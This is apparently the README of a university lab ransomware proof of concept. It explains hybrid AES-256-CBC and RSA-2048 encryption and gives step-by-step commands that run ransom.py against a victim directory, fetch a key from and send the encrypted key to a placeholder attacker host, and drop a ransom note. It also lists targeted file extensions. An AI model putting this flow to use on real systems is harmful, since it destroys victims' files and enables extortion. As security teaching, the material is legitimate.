# ransomware-lab

A educational ransomware proof-of-concept built for a Kathara network lab. Demonstrates hybrid AES+RSA encryption, key exfiltration over TCP, and file recovery — the same cryptographic architecture used by real ransomware families like WannaCry or LockBit.

> **Disclaimer:** This project is strictly for educational purposes in an isolated lab environment. Never run this on systems you don't own.

---

## How it works

Real ransomware faces a fundamental problem: how do you encrypt the victim's files in a way that *only you* can decrypt them?

The answer is **hybrid encryption** — combining two cryptographic primitives:

### AES-256-CBC — file encryption

AES is a **symmetric** cipher: the same key encrypts and decrypts. It's extremely fast, making it suitable for large files.

```
plaintext + AES key → ciphertext
ciphertext + AES key → plaintext   ← same key
```

The catch: if the AES key is stored on the victim's machine, they can decrypt everything themselves. So we need a way to protect the key.

**CBC (Cipher Block Chaining)** is the mode used with AES. AES works on fixed 16-byte blocks. CBC chains each block to the previous one — each plaintext block is XORed with the previous ciphertext block before encryption. This ensures that two identical blocks of plaintext produce different ciphertext blocks.

```
block 1 → XOR with IV          → AES → ciphertext block 1
block 2 → XOR with cipherblock 1 → AES → ciphertext block 2
...
```

**IV (Initialization Vector):** 16 random bytes used to seed the first block. A fresh IV is generated for every file so that encrypting the same file twice produces different output. The IV is not secret — it's stored in plaintext at the beginning of the `.enc` file because it's needed for decryption.

**PKCS7 padding:** AES requires input to be an exact multiple of 16 bytes. PKCS7 pads the last block with bytes whose value equals the number of bytes added:

```
data:   [A][B][C][D][E]           ← 5 bytes
padded: [A][B][C][D][E][0B][0B][0B][0B][0B][0B][0B][0B][0B][0B][0B]  ← 16 bytes
```

On decryption, the last byte tells us how many padding bytes to strip.

### RSA-2048 — key protection

RSA is **asymmetric**: two mathematically linked keys.
- **Public key** → encrypts (safe to share with anyone)
- **Private key** → decrypts (attacker keeps this secret)

```
AES key + public.pem  → encrypted AES key   ← victim cannot reverse this
encrypted AES key + private.pem → AES key   ← attacker only
```

**OAEP padding** is used with RSA (instead of raw RSA encryption) to add randomness before encryption. This prevents mathematical attacks and ensures that encrypting the same AES key twice produces different output.

### The full flow

```
ATTACKER                              TARGET
────────                              ──────
generate RSA-2048 keypair
  private.pem  ← keep secret
  public.pem   ──────────────────→   ransom.py fetches public.pem

                                      generate random AES-256 key
                                      for each file:
                                        generate random IV
                                        pad with PKCS7
                                        encrypt with AES-256-CBC
                                        write [IV + ciphertext] → file.enc
                                        delete original file
                                      encrypt AES key with RSA public.pem
                                      ← exfiltrate encrypted AES key (TCP)
                                      drop ransom note

receive encrypted AES key
decrypt with private.pem → AES key
─────────────────────────────────→   decrypt.py receives AES key
                                      for each .enc file:
                                        read IV (first 16 bytes)
                                        decrypt with AES-256-CBC
                                        unpad PKCS7
                                        restore original file
```

---

## Project structure

```
ransomware-lab/
├── genkey.py       # generate RSA keypair (run on attacker)
├── ransom.py       # encrypt target directory (run on target)
├── keyserver.py    # receive exfiltrated AES keys (run on attacker)
└── decrypt.py      # restore files after "payment" (run on attacker → target)
```

---

## Usage

### Requirements

```bash
pip install cryptography
```

### Step 1 — Generate RSA keypair (attacker)

```bash
python3 genkey.py
# produces private.pem (keep secret) and public.pem (send to target)
```

### Step 2 — Start key listener and file server (attacker, two terminals)

```bash
# Serve public.pem to the target
python3 -m http.server 8080

# Listen for exfiltrated AES keys
python3 keyserver.py 9999
```

### Step 3 — Create test files on target

```bash
mkdir -p /home/victim/documents
echo "confidential data" > /home/victim/documents/secret.txt
echo "password: admin123" > /home/victim/documents/passwords.txt
```

### Step 4 — Run ransomware on target

```bash
python3 ransom.py /home/victim/documents \
    http://<attacker_ip>:8080/public.pem \
    <attacker_ip>:9999
```

The script will:
- Fetch `public.pem` from the attacker
- Encrypt all targeted files in the directory
- Exfiltrate the encrypted AES key to the attacker's keyserver
- Drop a `README_DECRYPT.txt` ransom note

### Step 5 — Decrypt files (attacker)

```bash
# Use the victim_id printed by keyserver.py
python3 decrypt.py /home/victim/documents <VICTIM_ID> \
    private.pem received_keys/<VICTIM_ID>.hex
```

---

## Targeted file extensions

`.txt` `.pdf` `.doc` `.docx` `.xls` `.xlsx` `.jpg` `.jpeg` `.png` `.zip` `.py` `.sh` `.conf` `.cfg` `.log` `.csv` `.json` `.xml`

---

## Key design notes

**Why `os.urandom()` and not `random`?**
`os.urandom()` requests random bytes directly from the Linux kernel (`/dev/urandom`), which is cryptographically secure. Python's `random` module is predictable and must never be used for cryptographic purposes.

**Why a fresh IV per file?**
If two files were encrypted with the same key and the same IV, an attacker could XOR the two ciphertexts and cancel out the key, leaking information about the plaintexts. A random IV per file prevents this entirely.

**Why `NoEncryption()` for `private.pem`?**
In this lab context, `private.pem` never leaves the attacker's machine, so password-protecting it adds no security benefit. In a production scenario one would use `BestAvailableEncryption(password)` to protect the private key at rest.

**Why not just use RSA to encrypt the files directly?**
RSA is slow and limited in how much data it can encrypt (at most a few hundred bytes for a 2048-bit key). AES is orders of magnitude faster for bulk data. The hybrid approach — AES for files, RSA for the AES key — is the standard solution used by every real ransomware family.

---

## Cryptographic stack

| Component | Algorithm | Purpose |
|-----------|-----------|---------|
| File encryption | AES-256-CBC | Fast symmetric encryption of file contents |
| Key protection | RSA-2048-OAEP | Asymmetric encryption of the AES key |
| Padding (symmetric) | PKCS7 | Aligns plaintext to AES block size |
| Padding (asymmetric) | OAEP + MGF1/SHA-256 | Secure RSA padding, prevents chosen-plaintext attacks |
| Key/IV generation | os.urandom() | Cryptographically secure random bytes from kernel |

---

## Credits

Built as a lab exercise for ESIEE Paris — network security course.
Cryptographic implementation via the [cryptography](https://cryptography.io) Python library.
